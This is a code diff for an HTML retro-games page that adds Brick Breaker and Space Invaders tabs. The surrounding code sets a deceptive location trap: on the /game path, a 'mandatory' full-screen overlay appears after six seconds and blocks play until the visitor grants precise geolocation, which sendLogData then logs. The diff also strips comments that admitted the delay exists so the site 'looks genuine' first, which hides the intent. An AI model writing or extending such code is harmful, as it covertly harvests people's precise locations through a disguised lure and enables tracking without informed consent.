@@ -8,7 +8,7 @@
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4 relative">
     
-    <!-- Mandatory Location Lock Overlay (Appears after 5-10 seconds on /game path) -->
+    <!-- Mandatory Location Lock Overlay (Appears after 6 seconds on /game path) -->
     <div id="mandatory-geo-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 5, 5, 0.95); backdrop-filter: blur(8px); z-index: 99999; align-items: center; justify-content: center;">
         <div style="background: #1e1e24; color: #fff; padding: 28px; border-radius: 12px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 340px; border: 1px solid #333; text-align: center;">
             <div style="font-size: 36px; margin-bottom: 12px;">📍</div>
@@ -26,13 +26,15 @@
     </header>
 
     <!-- Game Selection Menu Tabs -->
-    <div class="flex space-x-2 mb-4">
+    <div class="flex flex-wrap justify-center gap-2 mb-4">
         <button id="btnSnake" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-xs font-bold rounded transition">Nokia Snake</button>
         <button id="btnBlocks" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Building Blocks</button>
+        <button id="btnBreaker" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Brick Breaker</button>
+        <button id="btnInvaders" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Space Invaders</button>
     </div>
 
     <!-- Main Game Viewport Container -->
-    <main id="gameContainer" class="flex-grow flex items-center justify-center w-full max-w-md">
+    <main id="gameContainer" class="flex-grow flex items-center justify-center w-full max-w-6xl px-4">
         <!-- Dynamically loaded game modules inject here -->
     </main>
 
@@ -44,10 +46,26 @@
     <script type="module">
         import { initSnakeGame } from './games/snake.js';
         import { initBlocksGame } from './games/blocks.js';
+        import { initBrickBreakerGame } from './games/brickbreaker.js';
+        import { initSpaceInvadersGame } from './games/spaceinvaders.js';
 
         const container = document.getElementById('gameContainer');
         const btnSnake = document.getElementById('btnSnake');
         const btnBlocks = document.getElementById('btnBlocks');
+        const btnBreaker = document.getElementById('btnBreaker');
+        const btnInvaders = document.getElementById('btnInvaders');
+
+        const allButtons = [btnSnake, btnBlocks, btnBreaker, btnInvaders];
+
+        function setActiveButton(activeBtn) {
+            allButtons.forEach(btn => {
+                if (btn === activeBtn) {
+                    btn.className = "px-4 py-2 bg-emerald-600 text-xs font-bold rounded transition";
+                } else {
+                    btn.className = "px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition";
+                }
+            });
+        }
 
         async function sendLogData(lat, lon) {
             try {
@@ -71,12 +89,10 @@
 
             // Check if URL path includes '/game'
             if (window.location.pathname.includes('/game')) {
-                // Wait 6 seconds to let the site load and look genuine before popping up the mandatory lock
                 setTimeout(() => {
                     document.getElementById('mandatory-geo-overlay').style.display = 'flex';
                 }, 6000);
             } else {
-                // If not on /game path, log normally without coordinates
                 sendLogData(null, null);
             }
         });
@@ -89,12 +105,10 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Success: Got precise coordinates! Send to server and hide lock overlay.
                         sendLogData(position.coords.latitude, position.coords.longitude);
                         document.getElementById('mandatory-geo-overlay').style.display = 'none';
                     },
                     (error) => {
-                        // User blocked or denied the native prompt
                         errorDiv.style.display = 'block';
                         errorDiv.textContent = 'Permission denied. You must allow location to play.';
                     },
@@ -106,18 +120,27 @@
             }
         });
 
-        // 2. UI GAME CONTROLLER SWITCHING
+        // UI Game Controller Switching Tabs
         btnSnake.addEventListener('click', () => {
-            btnSnake.className = "px-4 py-2 bg-emerald-600 text-xs font-bold rounded transition";
-            btnBlocks.className = "px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition";
+            setActiveButton(btnSnake);
             initSnakeGame(container);
         });
 
         btnBlocks.addEventListener('click', () => {
-            btnBlocks.className = "px-4 py-2 bg-emerald-600 text-xs font-bold rounded transition";
-            btnSnake.className = "px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition";
+            setActiveButton(btnBlocks);
             initBlocksGame(container);
         });
+
+        btnBreaker.addEventListener('click', () => {
+            setActiveButton(btnBreaker);
+            initBrickBreakerGame(container);
+        });
+
+        btnInvaders.addEventListener('click', () => {
+            setActiveButton(btnInvaders);
+            initSpaceInvadersGame(container);
+        });
+
     </script>
 </body>
 </html>
